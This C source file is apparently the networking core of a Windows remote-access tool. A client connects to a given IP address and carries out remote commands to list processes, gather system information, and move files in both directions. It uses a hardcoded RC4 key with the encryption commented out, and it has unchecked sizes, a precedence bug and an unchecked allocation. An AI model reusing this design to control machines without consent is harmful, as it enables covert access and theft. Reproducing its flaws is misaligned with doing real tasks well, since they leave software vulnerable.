#include "networking.h"

#define RC4_KEY "HELLOWORLDHELLOWORLDHELLOWORLD12"

BOOL SendData(struct Connection* conn, enum PacketType type, unsigned char* data, unsigned long datasz)
{
	//for now lets send everything as one stream, yaay tcp.

	struct MainHeader header;
	header.type = type;
	header.totalSize = datasz;
	unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(struct MainHeader) + datasz);
	if (buffer)
	{
		memcpy(buffer, &header, sizeof(struct MainHeader));
		memcpy(buffer + sizeof(struct MainHeader), data, datasz);
		if (conn->connected && datasz)
		{
			//RC4(conn->key, sizeof(conn->key), ((char*)buffer + sizeof(struct MainHeader)), datasz, ((char*)buffer + sizeof(struct MainHeader)));
		}
		int result = send(conn->sockfd, buffer, sizeof(struct MainHeader) + datasz, 0);

		HeapFree(GetProcessHeap(), 0, buffer);
		return result == datasz + sizeof(struct MainHeader);
	}
	 
	return FALSE;
}

BOOL RecvData(struct Connection* conn, struct MainHeader** output)
{
	char buffer[sizeof(struct MainHeader)];
	int result = 0;
	if (result = recv(conn->sockfd, buffer, sizeof(struct MainHeader), MSG_PEEK) == sizeof(struct MainHeader))
	{
		struct MainHeader* m = (struct MainHeader*)buffer;
		struct MainHeader* recvbuf = (struct MainHeader*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(struct MainHeader) + m->totalSize);
		result = recv(conn->sockfd, recvbuf, sizeof(struct MainHeader) + m->totalSize, MSG_WAITALL);
		if (result != sizeof(struct MainHeader) + m->totalSize)
		{
			*output = NULL;

			HeapFree(GetProcessHeap(), 0, recvbuf);
			return FALSE;
		}

		if (recvbuf->totalSize && conn->connected)
		{
			//RC4(conn->key, sizeof(conn->key), ((char*)recvbuf + sizeof(struct MainHeader)), recvbuf->totalSize, ((char*)recvbuf + sizeof(struct MainHeader)));
		}
		*output = recvbuf;
		return TRUE;
	}
	return FALSE;
}

void ServerThread(void* data);
void ClientThread(void* data);

BOOL StartConnectionServer(SOCKET sockfd)
{
	BOOL result = FALSE;
	struct Connection* conn = (struct Connection*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(struct Connection));
	if (conn)
	{
		conn->sockfd = sockfd;
		memcpy(conn->key, RC4_KEY, strlen(RC4_KEY));
		conn->connected = TRUE;
		conn->messages = CreateQueue();
		result = TRUE;
		properties.currentConnection = conn;
		conn->threadHandle = CreateThread(NULL, 0, ServerThread, conn, 0, NULL);
		printf("Connected\n");
	}

	return result;
}

BOOL StartConnectionClient(char* ipaddr) //TODO: DNS Support?
{
	BOOL result = FALSE;
	struct Connection* conn = (struct Connection*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(struct Connection));
	if (conn)
	{
		conn->sockfd = socket(AF_INET, SOCK_STREAM, 0);
		if (conn->sockfd != INVALID_SOCKET)
		{
			struct sockaddr_in servaddr;
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = inet_addr(ipaddr);
			servaddr.sin_port = htons(PORT);
			if (connect(conn->sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) == 0)
			{
				memcpy(conn->key, RC4_KEY, strlen(RC4_KEY));
				result = TRUE;
				conn->connected = TRUE;
				conn->threadHandle = CreateThread(NULL, 0, ClientThread, conn, 0, NULL);
				printf("Connected to %s\n", ipaddr);
				properties.currentConnection = conn;
			}
		}

		if (!conn->connected)
		{
			if (conn->sockfd != INVALID_SOCKET)
			{
				closesocket(conn->sockfd);
			}

			HeapFree(GetProcessHeap(), 0, conn);
		}

	}

	return result;
}

void ClientThread(void* data)
{
	BOOL running = TRUE;
	struct Connection* conn = (struct Connection*)data;
	while (running)
	{
		struct MainHeader* packet = NULL;
		if (!RecvData(conn, &packet))
		{
			continue;
		}

		switch (packet->type)
		{
		case ProcessListRequest:
			ClientCommandListProcesses(conn);
			break;
		case ClientDownloadFile:
			ClientCommandDownloadFile(conn, packet);
			break;
		case ClientUploadFile:
			ClientCommandUploadFile(conn, packet);
			break;
		case GetInformation:
			ClientCommandGetInfo(conn);
			break;
		case EndConnection:
			running = FALSE;
			break;
		}

		HeapFree(GetProcessHeap(), 0, packet);
	}
	closesocket(conn->sockfd);

	HeapFree(GetProcessHeap(), 0, conn);
}

void ServerThread(void* data)
{
	struct Connection* conn = (struct Connection*)data;
	BOOL running = TRUE;
	while (running)
	{
		struct MainHeader* packet = NULL;
		if (!RecvData(conn, &packet))
		{
			continue;
		}

		if (packet->type == EndConnection)
		{
			running = FALSE;

			HeapFree(GetProcessHeap(), 0, packet);
		}
		else
		{
			//let the user thread deal with it, its probably in response to their packets anyway.
			QueuePush(conn->messages, packet, sizeof(struct MainHeader) + packet->totalSize);
		}
		packet = NULL;
	}

	closesocket(conn->sockfd);
	FreeQueue(conn->messages);

	HeapFree(GetProcessHeap(), 0, conn);

}

